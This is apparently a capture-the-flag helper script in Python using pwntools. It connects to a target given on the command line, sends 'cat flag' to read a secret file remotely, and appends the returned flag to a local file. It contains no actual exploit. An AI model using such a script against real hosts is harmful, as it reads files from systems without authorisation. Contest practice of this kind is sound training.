#!/usr/bin/env python3
import os
import sys
from time import sleep
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './pwn'

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()

ip = server_ip = sys.argv[1].split(':')[0]
port = int(sys.argv[1].split(':')[1])
r = remote(ip, port)

r.sendline(b'cat flag')
r.recvuntil(b'{')
flag = b'flag{' + r.recvuntil(b'}')
write_to_flags(flag)

r.interactive()
